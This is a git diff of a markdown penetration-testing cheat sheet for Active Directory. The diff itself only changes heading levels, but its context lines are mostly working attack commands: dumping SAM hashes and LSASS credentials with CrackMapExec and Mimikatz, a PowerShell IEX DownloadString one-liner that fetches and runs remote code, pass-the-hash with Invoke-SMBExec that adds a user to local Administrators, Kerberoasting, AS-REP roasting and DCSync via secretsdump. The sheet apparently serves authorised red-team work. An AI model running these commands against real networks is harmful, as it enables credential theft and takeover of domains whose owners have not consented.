@@ -1,10 +1,6 @@
----
-title: Active Directory
-nav_order: 2
----
-## Active Directory
+# Active Directory
 
-### AD Mapping
+## AD Mapping
 
 Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
 
@@ -28,7 +24,7 @@ Invoke-Neo4j console
 Then execute BloodHound and import the zip file.
 
 
-### Shares :
+## Shares :
 
 Dump all shares via CrackMapExec. Can be used on Windows/Linux and via python :
 
@@ -55,7 +51,7 @@ Find-DomainShare -CheckShareAccess
 
 All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
 
-### Dump LSASS
+## Dump LSASS
 
 Mimikatz : Retrieve password/hash from a dump file :
 ```markdown
@@ -82,10 +78,10 @@ CrackMapExec : Dump local SAM hashes using local admin account
 ```markdown
 crackmapexec smb IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
 ```
-### Dump Everything
+## Dump Everything
 https://github.com/login-securite/DonPAPI
 
-### PowerShell one-liners
+## PowerShell one-liners
 
 Bloodhound : Using ingestors to collect the data and then send it to BloodHound.
 
@@ -123,14 +119,14 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Command “net localgroup Administrateurs USERNAME /ADD” -verbose
 ```
 
-### Impersonation
+## Impersonation
 ```markdown
 $password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
 ```
 
-### Kerberoast
+## Kerberoast
 GetUserSPNs and get hashes :
 ```markdown
 impacket-GetUserSPNs -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
@@ -146,7 +142,7 @@ DCSync exploit :
 impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<ipaddress>
 ```
 
-### AS-REP Roasting
+## AS-REP Roasting
 Look for users without Kerberos pre-authentication required attribute (using credential) :
 ```markdown
 impacket-GetNPUsers -dc-ip <IP-DC> domain/username:password
@@ -157,7 +153,7 @@ Get a TGT for a user, whithout his password, if you know that this account have 
 impacket-GetNPUsers -dc-ip <IP-DC> domain/username -no-pass
 ```
 
-### NTDS Exfiltration
+## NTDS Exfiltration
 
 Dump NTDS :
 
